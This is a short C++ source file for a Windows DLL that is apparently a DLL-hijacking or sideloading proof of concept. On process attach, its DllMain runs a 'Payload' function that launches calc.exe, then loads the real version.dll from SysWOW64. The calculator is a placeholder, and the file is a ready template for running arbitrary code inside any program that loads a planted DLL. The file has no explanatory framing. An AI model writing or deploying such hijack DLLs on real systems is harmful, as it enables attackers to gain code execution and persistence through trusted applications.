#include <windows.h>
#include <lmcons.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <iostream>
#include <string>
#pragma comment (lib, "version.lib")
void Payload()
{
WinExec("calc.exe", SW_SHOW);
}

void load(){
    HMODULE hDll = LoadLibrary("C:\\Windows\\SysWOW64\\version.dll");
    if (!hDll) {
        std::cerr << "Failed to load DLL.\n";
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      load();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}